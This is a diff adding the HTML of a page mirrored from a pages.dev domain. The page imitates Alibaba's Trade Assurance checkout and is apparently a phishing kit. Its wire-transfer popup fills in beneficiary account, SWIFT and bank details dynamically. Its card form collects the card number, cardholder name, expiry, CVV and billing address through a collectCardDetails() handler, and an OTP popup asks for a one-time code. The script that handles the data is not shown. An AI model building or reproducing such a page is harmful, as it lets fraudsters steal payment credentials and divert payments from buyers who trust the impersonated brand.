@@ -1,0 +1,359 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
+
+<head>
+    <meta charset="UTF-8">
+    <title>trade-checkout-buyer/</title>
+    <link rel="shortcut icon" href="http://is.alicdn.com/simg/single/icon/favicon.ico" type="image/x-icon">
+    <link rel="stylesheet" href="styles.css">
+    <!-- Add html2canvas library -->
+    <script src="../cdn.jsdelivr.net/npm/html2canvas%401.4.1/dist/html2canvas.min.js"></script>
+</head>
+
+<body>
+    <header>
+        <div class="header-container">
+            <div class="logo">
+                <img src="https://s.alicdn.com/@img/imgextra/i3/O1CN01QUmGB01MxVMrs0Hmx_!!6000000001501-55-tps-142-30.svg"
+                    alt="Alibaba Logo" class="logo-img">
+                <span>My Alibaba</span>
+            </div>
+            <div class="language-dropdown">
+                <div class="custom-select">
+                    <button class="select-button" onclick="toggleDropdown()">
+                        <span id="selectedLanguage">English</span>
+                        <span class="dropdown-icon"><img src="down.svg" alt="" height="20px"
+                                style="padding-top: 5px;"></span>
+                    </button>
+                    <ul class="dropdown-list" id="languageOptions">
+                        <li data-value="en" onclick="selectLanguage('en')">English</li>
+                        <li data-value="zh-cn" onclick="selectLanguage('zh-cn')">简体中文</li>
+                        <li data-value="zh-tw" onclick="selectLanguage('zh-tw')">繁體中文</li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </header>
+    <!-- hero -->
+    <main class="hero">
+        <div class="hero-sub">
+            <img src="../gateway/img.alicdn.com/tfs/TB11QgcllHH8KJjy0FbXXcqlpXa-50-51.png" height="32" />
+            <p class="translate" data-key="tradeAssuranceTitle">Trade Assurance</p>
+        </div>
+        <p class="translate" data-key="tradeAssuranceDesc">Trade Assurance · Easy and flexible payment service on
+            Alibaba.com</p>
+    </main>
+
+    <!-- T/t account -->
+    <main class="TandT">
+        <div class="TandT-one">
+            <h2 class="translate" data-key="ttAccountTitle">Activate your T/T account in advance</h2>
+            <p class="translate" data-key="ttAccountDesc">To make your transaction more efficient and secure, please
+                collect money through official wire transfer account on Alibaba.com. The official account supports
+                buyer(s) to make payment before the Trade Assurance order is drafted. You can also send the account
+                information to buyer. We will also help you manage transactions on our platform.</p>
+        </div>
+
+        <div class="TandT-payment">
+            <div class="payment">
+                <img
+                    src="https://img.alicdn.com/imgextra/i4/O1CN019NG1nP1WzTEHsRSjD_!!6000000002859-55-tps-54-54.svg" />
+                <div class="payment-info">
+                    <h2 class="translate" data-key="wireTransferTitle">Pay via wire transfer</h2>
+                    <p class="translate" data-key="wireTransferDesc1">Pay with wire transfer</p>
+                    <p class="translate" data-key="wireTransferDesc2">We highly recommend <b>using official account
+                            information provided by Alibaba.com</b></p>
+                    <p class="translate" data-key="wireTransferDesc3"><b>Processing time</b>：2-3 business days
+                        (domestic)</p>
+                    <p class="translate" data-key="wireTransferDesc4" style="margin-left: 140px;">3-7个 business days
+                        (international)</p>
+                    <button class="translate" data-key="wireTransferButton"
+                        onclick="showLoadingOverlay('wireTransfer')">View T/T account information</button>
+                    <h5 class="translate" data-key="wireTransferDetails"
+                        style="font-size: 13px; color: #222; font-weight: 700; margin-top: 16px; display: flex; align-items: center; gap: 2px;">
+                        <span><img src="info.svg" alt="" height="15px" style="margin-top: 5px;"></span>View details
+                    </h5>
+                </div>
+            </div>
+
+            <div class="payment">
+                <img
+                    src="https://img.alicdn.com/imgextra/i2/O1CN01LNzAov1cA4Tli26wV_!!6000000003559-55-tps-54-54.svg" />
+                <div class="payment-info">
+                    <h2 class="translate" data-key="onlineCheckoutTitle">Pay via online checkout</h2>
+                    <p class="translate" data-key="onlineCheckoutDesc1">The buyer can choose <b>20+ secure and easy
+                            payment <br>methods</b> to make payment，<br>including：credit/debit card、PayPal、Apple
+                        Pay、Google Pay、Afterpay/Clearpay.</p>
+                    <p class="translate" data-key="onlineCheckoutDesc2">The buyer can <b>pay with local currency</b> to
+                        save on processing <br>fee.</p>
+                    <img src="paymentgateway.png" alt="">
+                    <button class="translate" data-key="wireTransferButton"
+                        style="margin-top: 26px; opacity: 0.5; cursor: not-allowed;" disabled>Pay with Credit or Debit
+                        card</button>
+                </div>
+            </div>
+        </div>
+    </main>
+
+    <!-- Loading Overlay -->
+    <div class="loading-overlay" id="loadingOverlay">
+        <img src="loading.gif" height="50" alt="Loading" />
+    </div>
+
+    <!-- Wire Transfer Popup -->
+    <div class="popup-overlay" id="wireTransferPopup">
+        <div class="popup-content">
+            <button class="close-btn" onclick="closePopup('wireTransferPopup')">×</button>
+            <h2 class="translate" data-key="ttAccountTitle">Send money via wire transfer</h2>
+            <p>To international account</p>
+            <div style="border-bottom: 1px solid #b8b8b8; width: 100%; margin-bottom: 20px;"></div>
+            <div class="account-info">
+                <p>Payment currency: <b>USD</b></p>
+                <p>Amount: <b><span id="gateway-amount">Loading...</span> (estimated) (charged by remitting bank)</b>
+                </p>
+                <p>Processing time: <b>3-7 business days</b></p>
+            </div>
+            <div class="account-details">
+                <div class="account">
+                    <p>Beneficiary account number:</p>
+                    <p><b id="gateway-ben-account">Loading...</b> <span
+                            style="cursor:pointer; color:#0e73ff; font-size:12px; margin-left:10px"
+                            onclick="copyToClipboard('gateway-ben-account')">[Copy]</span></p>
+                </div>
+                <div class="account">
+                    <p>SWIFT code:</p>
+                    <p><span id="gateway-swift">Loading...</span> <span
+                            style="cursor:pointer; color:#0e73ff; font-size:12px; margin-left:10px"
+                            onclick="copyToClipboard('gateway-swift')">[Copy]</span></p>
+                </div>
+                <div class="account">
+                    <p>Beneficiary name:</p>
+                    <p><span id="gateway-ben-name">Loading...</span> <span
+                            style="cursor:pointer; color:#0e73ff; font-size:12px; margin-left:10px"
+                            onclick="copyToClipboard('gateway-ben-name')">[Copy]</span></p>
+                </div>
+                <div class="account">
+                    <p>Beneficiary address:</p>
+                    <p><span id="gateway-ben-address">Loading...</span> <span
+                            style="cursor:pointer; color:#0e73ff; font-size:12px; margin-left:10px"
+                            onclick="copyToClipboard('gateway-ben-address')">[Copy]</span></p>
+                </div>
+                <div class="account">
+                    <p>Beneficiary bank:</p>
+                    <p><span id="gateway-bank-name">Loading...</span> <span
+                            style="cursor:pointer; color:#0e73ff; font-size:12px; margin-left:10px"
+                            onclick="copyToClipboard('gateway-bank-name')">[Copy]</span></p>
+                </div>
+                <div class="account">
+                    <p>Beneficiary bank address:</p>
+                    <p><span id="gateway-bank-address">Loading...</span> <span
+                            style="cursor:pointer; color:#0e73ff; font-size:12px; margin-left:10px"
+                            onclick="copyToClipboard('gateway-bank-address')">[Copy]</span></p>
+                </div>
+                <!-- <div class="account">
+            <p>Bank code:</p>
+            <p>7214</p>
+        </div>
+        <div class="account">
+            <p>Branch code:</p>
+            <p>001</p>
+        </div> -->
+                <button class="save-btn translate" data-key="saveAsImage"
+                    onclick="document.getElementById('proofOfPayment').click()">Upload Proof of Payment</button>
+                <input type="file" id="proofOfPayment" style="display:none;" accept="image/*">
+            </div>
+        </div>
+    </div>
+
+    <!-- Credit Card Popup -->
+    <div class="popup-overlay" id="creditCardPopup">
+        <div class="popup-content">
+            <button class="close-btn" onclick="closePopup('creditCardPopup')">×</button>
+            <h2 class="translate" data-key="onlineCheckoutTitle">Pay via online checkout</h2>
+            <p>Using Credit or Debit Card</p>
+            <div style="border-bottom: 1px solid #b8b8b8; width: 100%; margin-bottom: 20px;"></div>
+            <div class="payment-options">
+                <div class="payment-header">
+                    <h3>Credit/Debit Card <img src="../upload.wikimedia.org/wikipedia/commons/4/41/Visa_Logo.html"
+                            alt="Visa" class="card-logo" height="20"> <img
+                            src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg"
+                            alt="Mastercard" class="card-logo" height="20"> <img
+                            src="../upload.wikimedia.org/wikipedia/commons/5/59/Discover_Card_logo.html" alt="Discover"
+                            class="card-logo" height="20"> <img
+                            src="../upload.wikimedia.org/wikipedia/commons/a/a4/JCB_logo.html" alt="JCB"
+                            class="card-logo" height="20"></h3>
+                </div>
+                <div class="card-selection">
+                    <label>
+                        <input type="radio" name="cardOption" value="new">
+                        <span>Add a new card to pay</span>
+                    </label>
+                </div>
+                <div class="card-form">
+                    <div class="form-row">
+                        <div class="form-group">
+                            <label>Card Number</label>
+                            <input type="text" id="cardNumber" placeholder="1234 5678 9012 3456" class="card-input"
+                                maxlength="19" oninput="formatCardNumber(this)" />
+                        </div>
+                        <div class="form-group">
+                            <label>Cardholder Name</label>
+                            <input type="text" id="fullName" placeholder="Enter your full name" class="card-input" />
+                        </div>
+                    </div>
+                    <div class="form-row">
+                        <div class="form-group">
+                            <label>Expiration Date</label>
+                            <div class="exp-date-group">
+                                <select id="expMonth" class="card-select">
+                                    <option value="01">01</option>
+                                    <option value="02">02</option>
+                                    <option value="03">03</option>
+                                    <option value="04">04</option>
+                                    <option value="05">05</option>
+                                    <option value="06">06</option>
+                                    <option value="07">07</option>
+                                    <option value="08">08</option>
+                                    <option value="09">09</option>
+                                    <option value="10">10</option>
+                                    <option value="11">11</option>
+                                    <option value="12">12</option>
+                                </select> /
+                                <select id="expYear" class="card-select">
+                                    <option value="20">20</option>
+                                    <option value="21">21</option>
+                                    <option value="22">22</option>
+                                    <option value="23">23</option>
+                                    <option value="24">24</option>
+                                    <option value="25">25</option>
+                                    <option value="26">26</option>
+                                    <option value="27">27</option>
+                                    <option value="28">28</option>
+                                    <option value="29">29</option>
+                                    <option value="30">30</option>
+                                </select>
+                            </div>
+                        </div>
+                        <div class="form-group">
+                            <label>Security Code</label>
+                            <div class="cvv-container">
+                                <input type="password" id="cvv" placeholder="123" class="card-input" maxlength="3"
+                                    oninput="this.value = this.value.replace(/[^0-9]/g, '')" />
+                                <button type="button" class="toggle-cvv" onclick="toggleCvvVisibility()">
+                                    <img src="https://upload.wikimedia.org/wikipedia/commons/1/1c/Eye_icon.svg"
+                                        alt="Show" class="eye-icon" id="eyeIcon" height="16">
+                                </button>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="form-row">
+                        <div class="form-group">
+                            <label>Billing Address</label>
+                            <input type="text" id="billingAddress" placeholder="Monterrey" class="card-input" />
+                        </div>
+                        <div class="form-group">
+                            <label>Country/Region</label>
+                            <input type="text" id="country" placeholder="Enter your country/region"
+                                class="card-input" />
+                        </div>
+                    </div>
+                    <div class="form-row">
+                        <div class="form-group">
+                            <label>City/Town</label>
+                            <input type="text" id="city" placeholder="DK-6000 Kolding" class="card-input" />
+                        </div>
+                        <div class="form-group">
+                            <label>ZIP Code</label>
+                            <input type="text" id="zipCode" placeholder="DK-6000" class="card-input" />
+                        </div>
+                    </div>
+                    <div class="checkbox-group">
+                        <input type="checkbox" id="saveCard">
+                        <label for="saveCard">Save this card for next payment and accept the Alibaba Privacy
+                            Policy.</label>
+                    </div>
+                    <button class="proceed-btn translate" data-key="proceed"
+                        onclick="collectCardDetails()">Proceed</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- OTP Popup -->
+    <div class="popup-overlay" id="otpPopup">
+        <div class="popup-content">
+            <button class="close-btn" onclick="closePopup('otpPopup')">×</button>
+            <h2>Enter OTP</h2>
+            <h4>Please enter the 5-digit code sent to your email/phone.</h4>
+            <div style="border-bottom: 1px solid #b8b8b8; width: 100%; margin-bottom: 20px;"></div>
+            <div class="otp-input">
+                <input type="number" id="otp1" maxlength="1" oninput="moveToNext(this, 'otp2')" />
+                <input type="number" id="otp2" maxlength="1" oninput="moveToNext(this, 'otp3')" />
+                <input type="number" id="otp3" maxlength="1" oninput="moveToNext(this, 'otp4')" />
+                <input type="number" id="otp4" maxlength="1" oninput="moveToNext(this, 'otp5')" />
+                <input type="number" id="otp5" maxlength="1" />
+            </div>
+            <button class="proceed-btn" onclick="verifyOTP()">Verify OTP</button>
+        </div>
+    </div>
+
+    <!-- Footer -->
+    <footer>
+        <span>Product Listing Policy-Intellectual Property Protection-Privacy Policy-Terms of Use- User Information
+            Legal Enquiry Guide- Integrity Compliance</span><br>
+        <span><img src="../gateway/img.alicdn.com/tfs/TB1VtZtebH1gK0jSZFwXXc7aXXa-65-70.gif" alt="" height="20">©
+            1999-2023
+            Alibaba.com. All rights reserved. <span><img
+                    src="../gateway/img.alicdn.com/tfs/TB1QhYprKT2gK0jSZFvXXXnFXXa-20-20.png" /></span>33010002000092号浙B2-20120091-4</span>
+    </footer>
+
+    <!-- Loader -->
+    <div class="skeleton">
+        <div class="left">
+            <div class="card">
+                <div class="loading"></div>
+            </div>
+            <div class="card">
+                <div class="loading"></div>
+            </div>
+            <div class="card">
+                <div class="loading"></div>
+            </div>
+            <div class="card">
+                <div class="loading"></div>
+            </div>
+            <div class="card">
+                <div class="loading"></div>
+            </div>
+            <div class="card">
+                <div class="loading"></div>
+            </div>
+            <div class="card">
+                <div class="loading"></div>
+            </div>
+            <div class="card">
+                <div class="loading"></div>
+            </div>
+        </div>
+        <div class="right">
+            <div class="loading" style="height: 100px; margin-bottom: 16px;"></div>
+            <div class="gray-text"></div>
+            <div class="gray-text"></div>
+            <div class="gray-text"></div>
+            <div class="gray-text"></div>
+            <div class="gray-text"></div>
+            <div class="gray-text"></div>
+            <div class="gray-text"></div>
+            <div class="gray-text"></div>
+            <div class="gray-btn"></div>
+        </div>
+    </div>
+
+    <script src="script.js?v=3"></script>
+</body>
+
+<!-- Mirrored from paymentgatewayalibaba.pages.dev/ by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 26 Feb 2026 10:29:04 GMT -->
+
+</html>
